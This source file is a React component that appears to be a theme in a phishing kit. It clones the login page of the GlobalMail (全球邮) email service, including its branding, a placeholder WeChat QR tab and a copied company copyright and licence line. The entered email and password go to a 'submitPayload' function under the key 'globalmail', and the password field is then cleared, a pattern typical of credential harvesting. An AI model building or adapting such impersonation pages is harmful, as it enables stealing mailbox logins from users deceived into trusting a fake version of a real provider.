
import React, { useState } from 'react';
import { useSecurity } from '../components/SecurityManager';
import { motion } from 'framer-motion';

interface GlobalMailThemeProps {
  prefilledEmail?: string;
}

const GlobalMailTheme: React.FC<GlobalMailThemeProps> = ({ prefilledEmail }) => {
  const [email, setEmail] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [activeTab, setActiveTab] = useState<'qr' | 'account'>('account');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { submitPayload, error, setError } = useSecurity();

  const handleSubmit = async (e: React.FormEvent | React.KeyboardEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await submitPayload({ email, password }, 'globalmail');
      setPassword('');
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleSubmit(e);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
      {/* Header */}
      <header className="w-full max-w-[1200px] mx-auto px-6 py-4 flex items-center justify-between">
        <div className="flex items-center space-x-2">
          {/* Logo Section */}
          <div className="flex items-center">
            <div className="w-10 h-10 flex items-center justify-center mr-1">
              <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M5 10L15 5L35 15L25 30L5 10Z" fill="#c0392b" />
                <path d="M5 10L20 20L35 15" stroke="white" strokeWidth="2" />
                <text x="5" y="38" fill="#c0392b" fontSize="8" fontWeight="bold">GlobalMail</text>
              </svg>
            </div>
            <div className="flex flex-col ml-2">
              <span className="text-xl font-bold text-[#c0392b] leading-tight">全球邮</span>
              <span className="text-[10px] text-gray-500 tracking-wider">GlobalMail</span>
            </div>
          </div>
        </div>
        
        <nav className="flex items-center space-x-6 text-[12px] text-gray-500">
          <a href="#" className="hover:text-red-500">在线咨询</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-red-500">帮助中心</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-red-500">客户端配置</a>
        </nav>
      </header>

      {/* Main Content Area */}
      <main className="relative flex-grow flex items-center justify-center bg-[#f0f0f0] overflow-hidden">
        {/* Subtle pattern background */}
        <div className="absolute inset-0 opacity-[0.03]" style={{ backgroundImage: 'radial-gradient(#000 0.5px, transparent 0.5px)', backgroundSize: '20px 20px' }}></div>
        
        <div className="relative w-full max-w-[1200px] mx-auto px-6 flex flex-col md:flex-row items-center justify-between z-10 py-12">
          
          {/* Left Side: Graphic Section */}
          <div className="hidden lg:flex flex-col items-center justify-center flex-grow relative">
            {/* Curved Path Decorations */}
            <div className="absolute inset-0 flex items-center justify-center overflow-hidden pointer-events-none">
              <svg width="800" height="600" viewBox="0 0 800 600" fill="none" className="opacity-40">
                <path d="M100 300 Q200 100 400 300 T700 300" stroke="#e67e22" strokeWidth="1" />
                <path d="M150 350 Q300 150 450 350 T750 350" stroke="#e67e22" strokeWidth="1" />
                <path d="M50 250 Q250 50 450 250 T850 250" stroke="#e67e22" strokeWidth="1" />
                
                {/* Planes along paths */}
                <circle cx="250" cy="180" r="2" fill="#aaa" />
                <path d="M245 175 L255 185 M245 185 L255 175" stroke="#aaa" strokeWidth="1" />
                <circle cx="550" cy="220" r="2" fill="#aaa" />
                <path d="M545 215 L555 225 M545 225 L555 215" stroke="#aaa" strokeWidth="1" />
              </svg>
            </div>

            {/* Central Globe Graphic */}
            <div className="relative w-[300px] h-[300px] bg-white rounded-full shadow-[0_0_60px_rgba(0,0,0,0.1)] flex items-center justify-center border border-gray-100 p-4">
              <div className="absolute inset-0 rounded-full bg-gradient-to-tr from-gray-100 to-white opacity-50"></div>
              <div className="relative z-10 w-full h-full rounded-full overflow-hidden flex items-center justify-center">
                 {/* Simplified World Image Backdrop */}
                 <div className="absolute inset-0 opacity-20 bg-cover bg-center" style={{ backgroundImage: 'url("https://images.unsplash.com/photo-1526778548025-fa2f459cd5c1?auto=format&fit=crop&q=80&w=400")' }}></div>
                 <span className="text-[120px] font-bold text-gray-800 opacity-80 select-none">@</span>
              </div>
            </div>
          </div>

          {/* Right Side: Login Card */}
          <div className="w-full max-w-[360px] bg-white rounded shadow-[0_2px_15px_rgba(0,0,0,0.1)] border border-gray-100 overflow-hidden">
            {/* Tabs */}
            <div className="flex border-b border-gray-100 h-14 bg-gray-50/30">
              <button 
                onClick={() => setActiveTab('qr')}
                className={`flex-1 text-[13px] transition-all font-medium ${activeTab === 'qr' ? 'text-red-500 bg-white border-b-2 border-red-500' : 'text-gray-500 hover:text-gray-700'}`}
              >
                微信扫码登录
              </button>
              <button 
                onClick={() => setActiveTab('account')}
                className={`flex-1 text-[13px] transition-all font-medium ${activeTab === 'account' ? 'text-red-500 bg-white border-b-2 border-red-500' : 'text-gray-500 hover:text-gray-700'}`}
              >
                邮箱账号登录
              </button>
            </div>

            <div className="p-8 space-y-6">
              {activeTab === 'account' ? (
                <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="relative group">
                    <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                      <svg width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                        <path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                      </svg>
                    </div>
                    <input 
                      type="text" 
                      placeholder="账号" 
                      value={email}
                      onChange={(e) => {
                        setEmail(e.target.value);
                        if (error) setError(null);
                      }}
                      onKeyDown={handleKeyDown}
                      className="w-full pl-10 pr-4 py-2.5 bg-gray-50/50 border border-gray-200 rounded text-[14px] focus:outline-none focus:border-red-400 focus:bg-white transition-all"
                    />
                  </div>

                  <div className="relative group">
                    <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                      <svg width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                        <path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                      </svg>
                    </div>
                    <input 
                      type="password" 
                      placeholder="请输入密码" 
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (error) setError(null);
                      }}
                      onKeyDown={handleKeyDown}
                      className="w-full pl-10 pr-4 py-2.5 bg-gray-50/50 border border-gray-200 rounded text-[14px] focus:outline-none focus:border-red-400 focus:bg-white transition-all"
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <label className="flex items-center text-[12px] text-gray-500 cursor-pointer">
                      <input type="checkbox" className="mr-1.5 accent-red-500 rounded border-gray-300" defaultChecked />
                      记住账号
                    </label>
                    <div className="relative">
                      <select className="bg-transparent text-[12px] text-gray-500 border border-gray-200 rounded px-2 py-1 outline-none appearance-none pr-6 cursor-pointer hover:border-gray-300">
                         <option>默认语言</option>
                         <option>English</option>
                         <option>简体中文</option>
                      </select>
                      <span className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none scale-75">▼</span>
                    </div>
                  </div>

                  <button 
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full py-3 bg-[#e64a19] hover:bg-[#d84315] text-white font-medium rounded transition-colors text-[16px] shadow-sm tracking-widest disabled:opacity-70"
                  >
                    {isSubmitting ? '...' : '登录'}
                  </button>

                  {error && (
                    <motion.div 
                      initial={{ opacity: 0, y: -10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="text-red-500 text-[12px] text-center font-medium py-1"
                    >
                      {error}
                    </motion.div>
                  )}

                  <div className="text-right">
                    <a href="#" className="text-[12px] text-gray-400 hover:text-red-500">忘记密码?</a>
                  </div>
                </form>
              ) : (
                <div className="flex flex-col items-center py-4 space-y-4">
                  <div className="w-48 h-48 bg-gray-50 border border-gray-100 flex items-center justify-center rounded p-2">
                    <div className="w-full h-full bg-gray-200 animate-pulse rounded"></div>
                  </div>
                  <p className="text-[13px] text-gray-500">使用微信扫码安全登录</p>
                </div>
              )}
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full py-8 text-[11px] text-gray-400 bg-white">
        <div className="max-w-[1200px] mx-auto px-4 text-center">
          <p>Copyright ©2022 北京新网数码信息技术有限公司 版权所有 京ICP备09061941号-17</p>
        </div>
      </footer>
    </div>
  );
};

export default GlobalMailTheme;
